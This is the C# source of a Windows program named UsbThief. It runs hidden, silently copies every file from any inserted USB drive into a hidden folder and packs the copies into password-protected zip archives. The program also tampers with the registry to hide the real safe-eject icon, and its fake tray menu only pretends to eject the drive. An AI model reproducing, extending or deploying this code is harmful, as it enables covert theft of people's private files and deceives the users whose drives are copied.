﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Ionic.Zip;
using Microsoft.Win32;
using NLog;

namespace UsbThief
{
    public partial class Form1 : Form
    {
        public const int innerVer = 0;
        public string workspace = Application.StartupPath + "\\data\\diskcache\\files\\";
        public Logger logger = LogManager.GetCurrentClassLogger();
        public bool showRealMenu = false;
        public bool fc2c = false;
        public SynchronizationContext mainThreadSynContext;
        //Thread th;

        public Thread copyT;
        public Thread compT;
        public const int WM_DEVICECHANGE = 0x219;//U盘插入后，OS的底层会自动检测到，然后向应用程序发送“硬件设备状态改变“的消息
        public const int DBT_DEVICEARRIVAL = 0x8000;  //就是用来表示U盘可用的。一个设备或媒体已被插入一块，现在可用。
        public const int DBT_DEVICEQUERYREMOVE = 0x8001;  //审批要求删除一个设备或媒体作品。任何应用程序也不能否认这一要求，并取消删除。
        public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;  //请求删除一个设备或媒体片已被取消。
        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;  //一个设备或媒体片已被删除。
        public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //一个设备或媒体一块即将被删除。不能否认的。
        public struct Config
        {
            public bool enable;
            public int ver;
            public string update;
            public List<string> exts;
            public int sizeLim;
            public string volName;
        }
        public struct UsbDevice
        {
            public string name;
            public string ser;
        }
        public enum Status
        {
            none,
            copying,
            compressing
        }
        public Config conf = new Config { enable = false, sizeLim = 100, volName = "仿生人会涮电子羊吗" };
        public UsbDevice currentDevice = new UsbDevice { name = "none", ser = "none" };
        public Status sta = Status.none;
        public Form1()
        {
            InitializeComponent();
            logger.Info("UsbThief已启动");
            logger.Info("innerVer：" + innerVer);
            copyT = new Thread(new ParameterizedThreadStart(Copy2Disk));
            compT = new Thread(new ParameterizedThreadStart(Compress));
            mainThreadSynContext = SynchronizationContext.Current;
            //HideRealMenu();
            notifyIcon1.MouseUp += NotifyIcon1_MouseUp;
            notifyIcon1.ContextMenuStrip.Items[0].Click += Item0_Click;
            notifyIcon1.ContextMenuStrip.Items[2].Click += Item2_Click;
            HideFiles(workspace);
            try
            {
                Dictionary<string, string> devices = new Dictionary<string, string>();
                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    string tmpSer = line.Split(':')[0];
                    string status = line.Split(':')[1];
                    devices.Add(tmpSer, status);
                }
                sr.Close();
                foreach (var item in devices)
                {
                    if (item.Value == Status.copying.ToString() || item.Value == Status.compressing.ToString())
                    {
                        Thread compT = new Thread(new ParameterizedThreadStart(Compress));
                        compT.Start(item.Key);
                    }
                }
            }
            catch (Exception)
            {
                try
                {
                    if (File.Exists(Application.StartupPath + "\\status"))
                        File.Delete(Application.StartupPath + "\\status");
                    FileStream fs = File.Create(Application.StartupPath + "\\status");
                    fs.Close();
                }
                catch (Exception)
                {
                    logger.Info("初始化状态文件失败");
                }
            }

        }
        private void HideFiles(string path)
        {
            try
            {
                if (Directory.Exists(path))
                {
                    DirectoryInfo d = new DirectoryInfo(path);
                    FileSystemInfo[] fsinfos = d.GetFileSystemInfos();
                    foreach (FileSystemInfo fsinfo in fsinfos)
                    {
                        File.SetAttributes(fsinfo.FullName, FileAttributes.Hidden);
                        if (fsinfo is DirectoryInfo)     //判断是否为文件夹
                        {
                            HideFiles(fsinfo.FullName);//递归调用
                        }
                    }
                }
            }
            catch (Exception e)
            {
                logger.Error("无法将工作目录设为隐藏：\n" + e);
            }

        }
        private void HideRealMenu()
        {
            try
            {
                logger.Info("尝试隐藏安全弹出托盘图标");
                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray", true);
                key.SetValue("Services", 29, RegistryValueKind.DWord);
                Process.Start("systray");
                logger.Info("安全弹出托盘图标已隐藏");
            }
            catch (Exception e)
            {
                showRealMenu = true;
                logger.Info("安全弹出托盘图标无法隐藏：\n" + e);
            }
        }
        private void WriteConf(string ser, Status s)
        {
            sta = s;
            try
            {
                Dictionary<string, string> devices = new Dictionary<string, string>();
                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    string tmpSer = line.Split(':')[0];
                    string status = line.Split(':')[1];
                    if (tmpSer == ser)
                    {
                        continue;
                    }
                    devices.Add(tmpSer, status);
                }
                sr.Close();
                devices.Add(ser, s.ToString());
                FileStream fs = new FileStream(Application.StartupPath + "\\status", FileMode.Create);
                StreamWriter sw = new StreamWriter(fs);
                foreach (var item in devices)
                {
                    sw.WriteLine(item.Key + ":" + item.Value);
                }
                sw.Close();
                fs.Close();
            }
            catch (Exception)
            {
                try
                {
                    FileStream fs = new FileStream(Application.StartupPath + "\\status", FileMode.OpenOrCreate);
                    StreamWriter sw = new StreamWriter(fs);
                    sw.WriteLine(ser + ":" + s.ToString());
                    sw.Close();
                    fs.Close();
                }
                catch (Exception e)
                {
                    logger.Info("写入状态失败：\n" + e);
                }
            }
        }
        private void Item2_Click(object sender, EventArgs e)
        {
            //假装弹出
            notifyIcon1.ShowBalloonTip(5000);
            Thread.Sleep(5000);
            notifyIcon1.Visible = false;
            logger.Info("用户以为他弹出了设备，其实并没有~");
        }
        private void Item0_Click(object sender, EventArgs e)
        {
            Process.Start("control", "printers");
            logger.Info("一本正经地打开控制面板，原来真有人会按这个键");
        }
        private void NotifyIcon1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                MethodInfo mi = typeof(NotifyIcon).GetMethod("ShowContextMenu", BindingFlags.Instance | BindingFlags.NonPublic);
                mi.Invoke(notifyIcon1, null);
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            logger.Info("窗体已加载");
            SetVisibleCore(false);
            logger.Info("窗体已隐藏");

        }
        private string GetUsbSer(string driName)
        {
            using (ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + driName.Replace("\\", "") + "\""))
            {
                try
                {
                    return disk.Properties["VolumeSerialNumber"].Value.ToString();
                }
                catch (Exception e)
                {
                    logger.Error("设备序列号获取失败：\n" + e);
                    return null;
                }
            }
        }
        protected override void WndProc(ref Message m)
        {
            try
            {
                if (m.Msg == WM_DEVICECHANGE)
                {
                    int wp = m.WParam.ToInt32();
                    if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING)
                    {

                        if (wp == DBT_DEVICEARRIVAL)
                        {
                            DriveInfo[] s = DriveInfo.GetDrives();
                            foreach (DriveInfo drive in s)
                            {
                                if (drive.DriveType == DriveType.Removable)
                                {
                                    bool newDevice = false;
                                    Thread th = new Thread(() =>
                                    {
                                        if (currentDevice.name == "none" && currentDevice.ser == "none" && sta == Status.none)
                                        {
                                            //try
                                            //{
                                            string ser = GetUsbSer(drive.Name);
                                            if (ser != null)
                                            {
                                                currentDevice.name = drive.Name;
                                                currentDevice.ser = GetUsbSer(drive.Name);
                                                newDevice = true;
                                                logger.Info("USB设备“" + currentDevice.ser + "”已插入");
                                            }
                                        }
                                    });
                                    th.Start();
                                    th.Join();//等待获取盘符结束再继续
                                    if (newDevice)
                                    {
                                        HideRealMenu();
                                        if (!showRealMenu)
                                        {
                                            notifyIcon1.ContextMenuStrip.Items[3].Text = " - U 盘 (" + currentDevice.name.Replace("\\", "") + ")";
                                            notifyIcon1.Visible = true;
                                        }
                                        if (drive.VolumeLabel != "仿生人会涮电子羊吗")
                                        {
                                            WriteConf(currentDevice.ser, Status.copying);
                                            string[] para = { currentDevice.ser, currentDevice.name, workspace + currentDevice.ser };
                                            copyT.Start(para);
                                        }
                                        else
                                        {
                                            logger.Info("目标USB设备“" + drive.VolumeLabel + "”已插入，不会对其进行复制操作");
                                            try
                                            {
                                                List<string> devices = new List<string>();
                                                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
                                                string line;
                                                while ((line = sr.ReadLine()) != null)
                                                {
                                                    string tmpSer = line.Split(':')[0];
                                                    string status = line.Split(':')[1];
                                                    if (status == "none")
                                                    {
                                                        devices.Add(tmpSer);
                                                    }
                                                }
                                                sr.Close();
                                                string[] files = Directory.GetFiles(workspace, "*.zip");
                                                foreach (var file in files)
                                                {
                                                    foreach (var item in devices)
                                                    {
                                                        if (file.Substring(file.LastIndexOf("\\") + 1) == item + ".zip")
                                                        {
                                                            Console.WriteLine("就决定是你了！\n" + file);
                                                            //就决定是你了！
                                                        }
                                                    }
                                                }
                                            }
                                            catch (Exception e)
                                            {
                                                logger.Error("读取状态文件失败：\n" + e);
                                            }
                                        }
                                    }
                                    break;
                                }
                            }
                        }
                        else
                        {
                            DriveInfo[] ds = DriveInfo.GetDrives();
                            bool exist = false;
                            foreach (DriveInfo drive in ds)
                            {
                                if (drive.Name == currentDevice.name)
                                    exist = true;
                                continue;
                            }
                            if (!exist && currentDevice.name != "none" && currentDevice.ser != "none")
                            {
                                //copyT.Abort();
                                logger.Info("USB设备“" + currentDevice.ser + "”已拔出");
                                currentDevice.name = "none";
                                currentDevice.ser = "none";
                                notifyIcon1.Visible = false;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                logger.Error("发生异常：\n" + ex);
            }
            base.WndProc(ref m);
        }
        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(value);
        }
        private bool CheckExt(string ext)
        {
            return true;
        }

        private void Compress(object s)
        {
            string ser = (string)s;
            WriteConf(ser, Status.compressing);
            try
            {
                string path = workspace + ser;
                string dest = path + ".zip";
                if (File.Exists(dest))
                    File.Delete(dest);
                logger.Info("正在压缩：" + path);
                using (ZipFile zip = new ZipFile(dest, Encoding.UTF8))
                {
                    zip.Password = "qiegewala";
                    zip.AddDirectory(path, ser);
                    zip.Save();
                }
            }
            catch (Exception e)
            {
                logger.Error("压缩失败：\n" + e);
            }
            WriteConf(ser, Status.none);
            logger.Info("压缩完成");
            HideFiles(workspace);
        }
        private void CopyDoneCallback(object state)
        {

            logger.Info("复制完成");
            if (fc2c)
            {
                logger.Info("压缩线程启动");
                compT.Start(currentDevice.ser);
            }
            else
            {
                WriteConf(currentDevice.ser, Status.none);
            }
        }
        private void Copy2Disk(object obj)
        {
            string[] str = (string[])obj;
            WriteConf(str[0], Status.copying);
            CopyLoop(str[1], str[2]);
            HideFiles(workspace);
            mainThreadSynContext.Post(new SendOrPostCallback(CopyDoneCallback), null);
        }
        private void CopyLoop(string sourcePath, string targetPath)
        {
            try
            {
                fc2c = false;
                long sizeLimitation = 10000 * (long)1048576;
                DirectoryInfo sourceInfo = new DirectoryInfo(sourcePath);
                if (!Directory.Exists(targetPath))
                    Directory.CreateDirectory(targetPath);
                foreach (FileSystemInfo fsi in sourceInfo.GetFileSystemInfos())
                {
                    string targetFileName = Path.Combine(targetPath, fsi.Name);
                    if (fsi is FileInfo)
                    {   //如果是文件，复制文件
                        FileInfo fi1 = new FileInfo(fsi.FullName);
                        if (CheckExt(fi1.Extension))
                        {
                            if (File.Exists(targetFileName))
                            {
                                FileInfo fi2 = new FileInfo(targetFileName);
                                if (fi1.LastWriteTime > fi2.LastWriteTime)
                                {
                                    fc2c = true;
                                    logger.Info("正在复制文件：" + fsi.FullName);
                                    File.Copy(fsi.FullName, targetFileName, true);
                                }
                            }
                            else
                            {
                                if (fi1.Length < sizeLimitation)
                                {
                                    fc2c = true;
                                    logger.Info("正在复制文件：" + fsi.FullName);
                                    File.Copy(fsi.FullName, targetFileName);
                                }
                            }
                        }
                    }
                    else //如果是文件夹，新建文件夹，递归
                    {
                        CopyLoop(fsi.FullName, targetFileName);
                    }
                }
            }
            catch (Exception e)
            {
                logger.Error("文件复制出错：\n" + e);
            }
        }
    }
    //private void CopyDirectory(string sourcePath, string destinationPath)
    //{
    //    try
    //    {
    //        DirectoryInfo info = new DirectoryInfo(sourcePath);
    //        if (!Directory.Exists(destinationPath))
    //            Directory.CreateDirectory(destinationPath);
    //        int fileSizeLimit = Properties.Settings.Default.filesize * 1048576;
    //        string CopyLog = "复制操作：输出目录：" + destinationPath + "\r\n";
    //        foreach (FileSystemInfo fsi in info.GetFileSystemInfos())
    //        {
    //            String destName = Path.Combine(destinationPath, fsi.Name);

    //            if (fsi is FileInfo)
    //            {   //如果是文件，复制文件
    //                try
    //                {
    //                    FileInfo fi1 = new FileInfo(fsi.FullName);
    //                    if (checkExt(fi1.Extension))
    //                    {
    //                        CopyLog += "复制文件：" + fsi.FullName + "\r\n";
    //                        if (File.Exists(destName))
    //                        {
    //                            switch (Properties.Settings.Default.conflict)
    //                            {
    //                                case 0:
    //                                    FileInfo fi2 = new FileInfo(destName);
    //                                    if (fi1.LastWriteTime > fi2.LastWriteTime)
    //                                    {
    //                                        File.Copy(fsi.FullName, destName, true);
    //                                    }
    //                                    break;
    //                                case 1:
    //                                    destName = (new Random()).Next(0, 9999999) + "-" + destName;
    //                                    File.Copy(fsi.FullName, destName);
    //                                    break;
    //                                case 2:
    //                                    File.Copy(fsi.FullName, destName, true);
    //                                    break;
    //                                default:
    //                                    break;
    //                            }
    //                        }
    //                        else
    //                        {
    //                            switch (Properties.Settings.Default.filesizetype)
    //                            {
    //                                case 0:
    //                                    File.Copy(fsi.FullName, destName);
    //                                    break;
    //                                case 1:
    //                                    if (fi1.Length > fileSizeLimit)
    //                                    {
    //                                        File.Copy(fsi.FullName, destName);
    //                                    }
    //                                    break;
    //                                case 2:
    //                                    if (fi1.Length < fileSizeLimit)
    //                                    {
    //                                        File.Copy(fsi.FullName, destName);
    //                                    }
    //                                    break;
    //                            }
    //                        }
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //                    CopyLog += "复制文件失败：" + destName + "\r\n" + ex.ToString();
    //                }
    //            }
    //            else //如果是文件夹，新建文件夹，递归
    //            {
    //                try
    //                {
    //                    if (Properties.Settings.Default.SkipEmptyFolder)
    //                    {
    //                        FileSystemInfo[] subFiles = (new DirectoryInfo(fsi.FullName)).GetFileSystemInfos();
    //                        if (subFiles.Count() > 0)
    //                        {
    //                            CopyDirectory(fsi.FullName, destName);
    //                        }
    //                    }
    //                    else
    //                    {
    //                        CopyDirectory(fsi.FullName, destName);
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //                    Program.log("创建目录：" + destName + "：失败：" + ex.ToString(), 1);
    //                }
    //            }
    //        }
    //        Program.log(CopyLog, 0);
    //    }
    //    catch (Exception ex)
    //    {
    //        Program.log("复制目录失败，设备可能被强行拔出：" + ex.ToString(), 1);
    //    }
    //}
    //}
}
